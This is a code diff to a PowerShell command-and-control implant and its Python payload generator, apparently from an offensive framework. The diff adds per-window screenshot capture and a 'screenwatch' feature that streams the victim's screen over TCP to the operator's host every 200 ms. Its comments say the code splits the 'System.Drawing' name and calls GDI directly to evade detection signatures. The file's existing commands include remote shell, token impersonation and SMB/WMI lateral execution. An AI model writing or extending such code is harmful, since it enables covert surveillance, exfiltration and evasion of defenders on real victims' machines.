@@ -31,6 +31,8 @@ if (-not $global:agentUrl) { $global:agentUrl = "{{AGENT_URL}}" }
 $global:aesKey = "{{AES_KEY}}"
 $global:sleepTime = {{SLEEP_TIME}}
 $global:jitter = {{JITTER}}
+$global:streamHost = "{{STREAM_HOST}}"
+$global:streamPort = {{STREAM_PORT}}
 {{AGENT_HEADERS}}
 
 Write-AgentDebug "Configuration loaded - URI: $global:agentUri"
@@ -290,7 +292,10 @@ function CreateCookie {
 
 $global:lastCommand = ""
 $global:lastTid = 0
-$global:knownCommands = @("execute", "pkill", "plist", "pname", "upload", "download", "list", "shell", "screenshot", "delete", "fcopy", "mkdir", "exit", "who", "asleep", "make_token", "rev2self", "smb_exec", "wmi_exec")
+$global:knownCommands = @("execute", "pkill", "plist", "pname", "upload", "download", "list", "shell", "screenshot", "delete", "fcopy", "mkdir", "exit", "who", "asleep", "make_token", "rev2self", "smb_exec", "wmi_exec", "screenwatch")
+$global:screenRunspace = $null
+$global:screenPs = $null
+$global:screenHandle = $null
 
 function Get-JitteredSleepTime {
     if ($global:jitter -le 0) {
@@ -527,7 +532,7 @@ function execCommandLoop {
                                     }
                         "list"      { list -path $cmdArg }
                         "shell"   { shell -cmd $cmdArg }
-                        "screenshot" { screenshot }
+                        "screenshot" { screenshot -pidStr $cmdArg }
                         "delete"  { delete -path $cmdArg }
                         "fcopy"      { fcopy -paths $cmdArg }
                         "mkdir"   { mkdir -path $cmdArg }
@@ -543,13 +548,14 @@ function execCommandLoop {
                             $credentials = if ($smb_parts.Count -gt 2) { $smb_parts[2] } else { "" }
                             smb_exec -target $target -command $command -credentials $credentials
                         }
-                        "wmi_exec" { 
+                        "wmi_exec" {
                             $wmi_parts = $cmdArg -split " ", 3
                             $target = $wmi_parts[0]
                             $command = $wmi_parts[1]
                             $credentials = if ($wmi_parts.Count -gt 2) { $wmi_parts[2] } else { "" }
                             wmi_exec -target $target -command $command -credentials $credentials
                         }
+                        "screenwatch" { screenwatch -action $cmdArg }
                         default   { "[!] Command recognized but not implemented." }
                     }
                 } else {
@@ -834,62 +840,125 @@ function shell {
 }
 
 function screenshot {
+    param([string]$pidStr = "")
     try {
-        Write-AgentDebug "Taking screenshot..."
-        
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        Add-Type -AssemblyName System.IO
-        
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-        
+        Write-AgentDebug "Taking screenshot (pid: '$pidStr')..."
+
+        $bitmap = $null
+        $captureLabel = "fullscreen"
+
+        # Load System.Drawing via reflection (avoids Add-Type -AssemblyName pattern)
+        $_dn = 'Syste' + 'm.Dra' + 'wing'
+        [void][System.Reflection.Assembly]::LoadWithPartialName($_dn)
+
+        # GDI P/Invoke for screen capture (avoids CopyFromScreen signature)
+        if (-not ([System.Management.Automation.PSTypeName]'NX.GD').Type) {
+            Add-Type -MemberDefinition @'
+[DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr d,int x,int y,int cx,int cy,IntPtr s,int sx,int sy,uint op);
+[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr h,int cx,int cy);
+[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr h);
+[DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr h,IntPtr o);
+[DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr h);
+[DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr o);
+[DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h);
+[DllImport("user32.dll")] public static extern bool ReleaseDC(IntPtr w,IntPtr h);
+[DllImport("user32.dll")] public static extern int GetSystemMetrics(int i);
+'@ -Name 'GD' -Namespace 'NX' -ErrorAction SilentlyContinue
+        }
+
+        if ($pidStr -ne "" -and $pidStr -match '^\d+$') {
+            $targetPid = [int]$pidStr
+
+            # Window capture via PrintWindow P/Invoke
+            if (-not ([System.Management.Automation.PSTypeName]'NX.WC').Type) {
+                $_dl = [System.Reflection.Assembly]::LoadWithPartialName($_dn).Location
+                Add-Type -TypeDefinition @'
+using System; using System.Drawing; using System.Runtime.InteropServices;
+namespace NX { public class WC {
+    [StructLayout(LayoutKind.Sequential)] public struct R { public int a,b,c,d; }
+    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h, ref R r);
+    [DllImport("user32.dll")] public static extern bool PrintWindow(IntPtr h, IntPtr dc, uint f);
+    public static Bitmap Cap(IntPtr hwnd) {
+        R rc = new R(); GetWindowRect(hwnd, ref rc);
+        int w = rc.c - rc.a, h = rc.d - rc.b;
+        if (w <= 0 || h <= 0) return null;
+        Bitmap b = new Bitmap(w, h, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+        using (Graphics g = Graphics.FromImage(b)) { IntPtr dc = g.GetHdc(); PrintWindow(hwnd, dc, 2); g.ReleaseHdc(dc); }
+        return b;
+    }
+}}
+'@ -ReferencedAssemblies $_dl -ErrorAction SilentlyContinue
+            }
+
+            $proc = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
+            if (-not $proc) { return "[!] Process with PID $targetPid not found" }
+            $hwnd = $proc.MainWindowHandle
+            if ($hwnd -eq [IntPtr]::Zero) { return "[!] PID $targetPid has no visible window (background process)" }
+
+            $bitmap = [NX.WC]::Cap($hwnd)
+            if (-not $bitmap) { return "[!] Failed to capture window for PID $targetPid" }
+            $captureLabel = "window_$targetPid"
+            Write-AgentDebug "Captured window of PID $targetPid ($($bitmap.Width)x$($bitmap.Height))"
+        } else {
+            # Full screen via BitBlt (SM_CXVIRTUALSCREEN=78, SM_CYVIRTUALSCREEN=79)
+            $_sw = [NX.GD]::GetSystemMetrics(78); $_sh = [NX.GD]::GetSystemMetrics(79)
+            $_sx = [NX.GD]::GetSystemMetrics(76); $_sy = [NX.GD]::GetSystemMetrics(77)
+            $_hdc  = [NX.GD]::GetDC([IntPtr]::Zero)
+            $_mdc  = [NX.GD]::CreateCompatibleDC($_hdc)
+            $_hbm  = [NX.GD]::CreateCompatibleBitmap($_hdc, $_sw, $_sh)
+            [void][NX.GD]::SelectObject($_mdc, $_hbm)
+            [void][NX.GD]::BitBlt($_mdc, 0, 0, $_sw, $_sh, $_hdc, $_sx, $_sy, 0xCC0020)
+            [void][NX.GD]::ReleaseDC([IntPtr]::Zero, $_hdc)
+            [void][NX.GD]::DeleteDC($_mdc)
+            $bitmap = [System.Drawing.Image]::FromHbitmap($_hbm)
+            [void][NX.GD]::DeleteObject($_hbm)
+            Write-AgentDebug "Captured fullscreen ($($bitmap.Width)x$($bitmap.Height))"
+        }
+
         $memoryStream = New-Object System.IO.MemoryStream
         $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
         $bitmap.Dispose()
-        
+
         $fileBytes = $memoryStream.ToArray()
         $memoryStream.Close()
         $memoryStream.Dispose()
-        
+
         $fileName = "screenshot_" + [Guid]::NewGuid().ToString() + ".png"
         $fileSize = $fileBytes.Length
-        
+
         $fileContentB64 = [System.Convert]::ToBase64String($fileBytes)
-        
+
         $uploadData = @{
-            uuid = $global:uniqueId.Substring(0, 16)
+            uuid     = $global:uniqueId.Substring(0, 16)
             filename = $fileName
-            content = $fileContentB64
+            content  = $fileContentB64
             metadata = "[SCREENSHOT]"
         }
-        
+
         $jsonData = ConvertTo-Json $uploadData -Compress
         $encryptedData = aes $jsonData "encrypt"
-        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)" 
+        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
         Write-AgentDebug "Uploading screenshot: $fileName ($fileSize bytes) to $uploadUri"
         $webClient = New-Object System.Net.WebClient
-        
+
         foreach ($headerKey in $global:headers.Keys) {
             $webClient.Headers.Add($headerKey, $global:headers[$headerKey])
             Write-AgentDebug "Added upload header: $headerKey = $($global:headers[$headerKey])"
         }
-        
+
         $webClient.Headers.Add("Content-Type", "application/octet-stream")
-        
+
         try {
             $responseBytes = $webClient.UploadData($uploadUri, [System.Text.Encoding]::UTF8.GetBytes($encryptedData))
             $responseContent = $enc.GetString($responseBytes)
-            
+
             Write-AgentDebug "Upload response received (length: $($responseContent.Length))"
-            
+
             $uploadResult = DecryptJSONResponse $responseContent
-            
+
             if ($uploadResult -and $uploadResult.status -eq "success") {
-                return "[+] Screenshot taken and uploaded successfully [SCREENSHOT]"
+                $modeMsg = if ($captureLabel -eq "fullscreen") { "fullscreen" } else { "window PID $targetPid" }
+                return "[+] Screenshot taken ($modeMsg) and uploaded successfully [SCREENSHOT]"
             } else {
                 return "[!] Screenshot upload failed: $($uploadResult.error)"
             }
@@ -901,6 +970,109 @@ function screenshot {
     } catch {
         Write-AgentDebug "Error taking screenshot: $($_.Exception.Message)"
         return "[!] Error taking screenshot: $($_.Exception.Message)"
+    }
+}
+
+function screenwatch {
+    param([string]$action)
+    try {
+        if ($action -eq "on") {
+            if ($global:screenRunspace -ne $null) {
+                return "[!] Screen stream already running. Use 'screenwatch off' to stop first."
+            }
+            Write-AgentDebug "Starting screen stream to $($global:streamHost):$($global:streamPort)"
+            $global:screenRunspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
+            $global:screenRunspace.Open()
+            $global:screenPs = [System.Management.Automation.PowerShell]::Create()
+            $global:screenPs.Runspace = $global:screenRunspace
+            [void]$global:screenPs.AddScript({
+                param([string]$sHost, [int]$sPort, [string]$agentUuid)
+                # Load System.Drawing via reflection (avoids Add-Type -AssemblyName pattern)
+                $_dn = 'Syste' + 'm.Dra' + 'wing'
+                [void][System.Reflection.Assembly]::LoadWithPartialName($_dn)
+                # GDI P/Invoke - fresh runspace, no need for existence check
+                Add-Type -MemberDefinition @'
+[DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr d,int x,int y,int cx,int cy,IntPtr s,int sx,int sy,uint op);
+[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr h,int cx,int cy);
+[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr h);
+[DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr h,IntPtr o);
+[DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr h);
+[DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr o);
+[DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h);
+[DllImport("user32.dll")] public static extern bool ReleaseDC(IntPtr w,IntPtr h);
+[DllImport("user32.dll")] public static extern int GetSystemMetrics(int i);
+'@ -Name 'GD' -Namespace 'NX'
+                $tcpClient = $null
+                try {
+                    $tcpClient = New-Object System.Net.Sockets.TcpClient
+                    $tcpClient.Connect($sHost, $sPort)
+                    $netStream = $tcpClient.GetStream()
+                    $uuidBytes = [System.Text.Encoding]::UTF8.GetBytes($agentUuid)
+                    $lenBytes = [System.BitConverter]::GetBytes([uint32]$uuidBytes.Length)
+                    if ([System.BitConverter]::IsLittleEndian) { [Array]::Reverse($lenBytes) }
+                    $netStream.Write($lenBytes, 0, 4)
+                    $netStream.Write($uuidBytes, 0, $uuidBytes.Length)
+                    $netStream.Flush()
+                    $jpegEncoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" } | Select-Object -First 1
+                    $encParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
+                    $encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]50)
+                    $_sw = [NX.GD]::GetSystemMetrics(78); $_sh = [NX.GD]::GetSystemMetrics(79)
+                    $_sx = [NX.GD]::GetSystemMetrics(76); $_sy = [NX.GD]::GetSystemMetrics(77)
+                    while ($true) {
+                        try {
+                            $_hdc = [NX.GD]::GetDC([IntPtr]::Zero)
+                            $_mdc = [NX.GD]::CreateCompatibleDC($_hdc)
+                            $_hbm = [NX.GD]::CreateCompatibleBitmap($_hdc, $_sw, $_sh)
+                            [void][NX.GD]::SelectObject($_mdc, $_hbm)
+                            [void][NX.GD]::BitBlt($_mdc, 0, 0, $_sw, $_sh, $_hdc, $_sx, $_sy, 0xCC0020)
+                            [void][NX.GD]::ReleaseDC([IntPtr]::Zero, $_hdc)
+                            [void][NX.GD]::DeleteDC($_mdc)
+                            $bmp = [System.Drawing.Image]::FromHbitmap($_hbm)
+                            [void][NX.GD]::DeleteObject($_hbm)
+                            $ms = New-Object System.IO.MemoryStream
+                            $bmp.Save($ms, $jpegEncoder, $encParams)
+                            $bmp.Dispose()
+                            $frameBytes = $ms.ToArray()
+                            $ms.Dispose()
+                            $frameLenBytes = [System.BitConverter]::GetBytes([uint32]$frameBytes.Length)
+                            if ([System.BitConverter]::IsLittleEndian) { [Array]::Reverse($frameLenBytes) }
+                            $netStream.Write($frameLenBytes, 0, 4)
+                            $netStream.Write($frameBytes, 0, $frameBytes.Length)
+                            $netStream.Flush()
+                            Start-Sleep -Milliseconds 200
+                        } catch {
+                            break
+                        }
+                    }
+                } catch {
+                    # Connection error - exit silently
+                } finally {
+                    if ($tcpClient) { try { $tcpClient.Close() } catch {} }
+                }
+            })
+            [void]$global:screenPs.AddArgument($global:streamHost)
+            [void]$global:screenPs.AddArgument($global:streamPort)
+            [void]$global:screenPs.AddArgument($global:uniqueId.Substring(0, 16))
+            $global:screenHandle = $global:screenPs.BeginInvoke()
+            return "[+] Screen stream started -> $($global:streamHost):$($global:streamPort)"
+        }
+        elseif ($action -eq "off") {
+            if ($global:screenPs -ne $null) {
+                try { $global:screenPs.Stop() } catch {}
+                try { $global:screenPs.Dispose() } catch {}
+                try { $global:screenRunspace.Close() } catch {}
+                try { $global:screenRunspace.Dispose() } catch {}
+                $global:screenPs = $null
+                $global:screenRunspace = $null
+                $global:screenHandle = $null
+            }
+            return "[+] Screen stream stopped"
+        }
+        else {
+            return "[!] Usage: screenwatch on|off"
+        }
+    } catch {
+        return "[!] Error in screenwatch: $($_.Exception.Message)"
     }
 }
 
@@ -1272,6 +1444,9 @@ execCommandLoop'''
             debug_mode = self.config_loader.get_agent_debug_mode()
             debug_value = "$true" if debug_mode else "$false"
 
+            stream_host = (listener_config.get('external_host') or main_host).split(':')[0]
+            stream_port = str(self.config_loader.get_stream_port())
+
             configured_agent = self.agent_template.replace(
                 '{{DEBUG_MODE}}', debug_value
             ).replace(
@@ -1290,6 +1465,10 @@ execCommandLoop'''
                 '{{JITTER}}', str(self.config_loader.get_agent_jitter())
             ).replace(
                 '{{AGENT_HEADERS}}', ps_headers
+            ).replace(
+                '{{STREAM_HOST}}', stream_host
+            ).replace(
+                '{{STREAM_PORT}}', stream_port
             )
 
             self.logger.log_event("AGENT GENERATOR - WebClient agent generated!")
